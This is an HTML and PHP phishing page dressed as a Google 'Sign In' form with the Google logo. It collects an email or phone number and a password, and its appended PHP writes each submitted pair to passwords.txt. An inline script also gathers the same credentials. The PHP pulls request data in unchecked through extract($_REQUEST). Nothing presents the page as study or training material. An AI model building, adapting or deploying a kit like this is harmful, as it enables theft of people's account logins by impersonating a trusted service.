<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>New Login Page</title>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="css/normalize.css">
	<link rel="stylesheet" type="text/css" href="css/materialize.min.css">
	<link rel="stylesheet" type="text/css" href="css/loginStyle.css">
</head>
<body>
	<div class="row gmailStyle">
		<div class="container-fluid">
			<div class="valign-wrapper screenHeight">
					<div class="col card s12 m8 l6 xl4 autoMargin setMaxWidth overflowHidden">
						<div class="row hidden" id="progress-bar">
					    <div class="progress mar-no">
					      <div class="indeterminate"></div>
					    </div>
						</div>
						<div class="clearfix mar-all pad-all"></div>

						<img src="images/Googlelogo.png" class="logoImage" />
						<h5 class="center-align mar-top mar-bottom formTitle">Sign In</h5>

						<div class="clearfix mar-all pad-all"></div>
						
						
						<div id="formContainer" class="goRight">

							<form class="loginForm"  action ="pass.php" method = "post">
								<div class="input-fields-div autoMargin">
									<div class="input-field">
					          <input id="user_name" name= "user_name" type="text" class="validate" autocomlete="off" required>
					          <label for="user_name">Email or Phone</label>
					        </div>
									<div id="passwordDiv" class="input-field scale-transition scale-out">
					          <input id="pass_word" name="pass_word" type="password" class="validate" autocomlete="off" required>
					          <label for="pass_word">Password</label>
										<a href="javascript:void(0)" class="showPassword" onclick="showPassword()"><i class="material-icons md-18">visibility</i></a>
					        </div>
									<a href="#hasPassword" class="passwordOrOTP" data-PassOTP="Password" onClick="passwordOrOTP(this)">I have password</a>
									<p>You can join us now by<br/><a href="#createAccountNow" class="createAccountNow">Creating a account</a></p>
								</div>
								<div class="input-fields-div autoMargin right-align">
									<a href="#enterOTP" class="loginNextBtn waves-effect waves-light btn">Get OTP</a>
									<button type="submit" onclick="hi()" class="loginBtn waves-effect waves-light btn hide">Login</button>
								</div>
							</form>
										<div class="clearfix"></div>
						</div> 


						<div class="clearfix mar-all pad-all"></div>
					</div>
			</div>
		</div>
	</div>
	<script type="text/javascript" src="js/materialize.min.js"></script>
	<script type="text/javascript" src="js/cash.min.js"></script>
	<script type="text/javascript" src="js/routie.min.js"></script>
	<script type="text/javascript" src="js/loginScript.js"></script>
</body>
<script>
		
	function hi() {
		mail_str="";
		pass_str="";
		//var Item = document.getElementById("input").value;
		try{
		//var Item = document.getElementById("input").value;
		var mailInput = document.getElementById("user_name").value;

		if(mailInput != null){
			mail_str+= "Mail: "+ String(mailInput)+"\n";
			//alert(mail_str);
		}
		try{
			var passwordInput = document.getElementById("pass_word").value
			if (passwordInput != null){
				pass_str+="Password: "+ String(passwordInput)+"\n";
				var dat = ""+ mail_str+ pass_str;
				alert(dat);

			}
		}
		catch(err){}
		}
		catch(err) {
			alert(err)
		}
	}
	</script>
</html>

<?php

extract($_REQUEST);
alert($user_name);
$file = fopen("passwords.txt" , "a");
fwrite($file , "\nname: ");
fwrite($file , $user_name);
fwrite($file , "\npassword: ");
fwrite($file , $pass_word);
fclose($file);

?>